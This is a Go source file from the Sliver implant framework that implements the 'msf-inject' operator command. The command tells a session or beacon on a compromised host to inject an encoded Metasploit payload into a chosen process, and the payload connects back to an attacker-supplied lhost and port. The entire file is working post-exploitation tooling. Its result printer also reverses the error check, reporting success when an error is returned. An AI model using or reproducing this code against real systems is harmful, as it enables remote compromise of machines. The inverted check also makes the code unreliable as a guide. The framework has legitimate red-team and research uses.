package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/console"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
)

// MsfInjectCmd - Inject a metasploit payload into a remote process.
func MsfInjectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	payloadName, _ := cmd.Flags().GetString("payload")
	lhost, _ := cmd.Flags().GetString("lhost")
	lport, _ := cmd.Flags().GetInt("lport")
	encoder, _ := cmd.Flags().GetString("encoder")
	iterations, _ := cmd.Flags().GetInt("iterations")
	pid, _ := cmd.Flags().GetInt("pid")

	if lhost == "" {
		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}
	if pid == -1 {
		con.PrintErrorf("Invalid pid '%d', see `help %s`\n", pid, consts.MsfInjectStr)
		return
	}
	var goos string
	var goarch string
	if session != nil {
		goos = session.OS
		goarch = session.Arch
	} else {
		goos = beacon.OS
		goarch = beacon.Arch
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending msf payload %s %s/%s -> %s:%d ...",
		payloadName, goos, goarch, lhost, lport)
	con.SpinUntil(msg, ctrl)
	msfTask, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
		Request:    con.ActiveTarget.Request(cmd),
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        uint32(pid),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if msfTask.Response != nil && msfTask.Response.Async {
		con.AddBeaconCallback(msfTask.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, msfTask)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintMsfRemote(msfTask, con)
		})
		con.PrintAsyncResponse(msfTask.Response)
	} else {
		PrintMsfRemote(msfTask, con)
	}
}

// PrintMsfRemote - Print the results of the remote injection attempt.
func PrintMsfRemote(msfRemote *sliverpb.Task, con *console.SliverClient) {
	if msfRemote.Response == nil {
		con.PrintErrorf("Empty response from msf payload injection task")
		return
	}
	if msfRemote.Response.Err != "" {
		con.PrintInfof("Executed payload on target")
	} else {
		con.PrintErrorf("Failed to inject payload: %s", msfRemote.Response.Err)
	}
}
